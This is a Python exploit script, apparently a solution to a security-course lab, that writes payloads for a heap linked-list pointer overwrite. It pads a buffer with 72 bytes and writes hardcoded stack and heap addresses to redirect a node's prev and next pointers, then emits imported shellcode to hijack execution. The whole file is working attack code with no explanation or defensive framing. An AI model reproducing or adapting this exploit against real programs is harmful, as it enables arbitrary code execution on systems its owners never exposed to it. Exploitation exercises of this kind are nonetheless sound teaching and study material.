import sys
from shellcode import shellcode

if len(sys.argv) != 2:
    raise ValueError("Invalid number of arguments provided")

if not sys.argv[1].isdigit():
    raise ValueError("Argument must be an integer")

node_number = int(sys.argv[1])

if node_number < 1 or node_number > 3:
    raise ValueError("Argument must be 1, 2, or 3")

b_data_addr = b"\x88\x0f\x0f\x08"
c_data_addr = b"\xd8\x0f\x0f\x08"
# ebp_addr = b"\xf8\xb1\xf6\xbf"
ebp_addr = b"\xbc\xb1\xf6\xbf"

if node_number == 1:
    sys.stdout.buffer.write(b"a")
    # sys.stdout.buffer.write(b"a" * 72)

    # For overwriting the prev for b to &b.data
    # sys.stdout.buffer.write(b_data_addr)

    # For overwriting the next for b to &c.data
    # sys.stdout.buffer.write(c_data_addr)
    pass

elif node_number == 2:
    # sys.stdout.buffer.write(b"\x90" * 4)
    sys.stdout.buffer.write(b"b" * 72)

    # For overwriting the prev for c to the address of ebp
    sys.stdout.buffer.write(ebp_addr)

    # For overwriting the next of c to &c.data
    sys.stdout.buffer.write(c_data_addr)

elif node_number == 3:
    # sys.stdout.buffer.write(b"c" * 4)
    sys.stdout.buffer.write(shellcode)

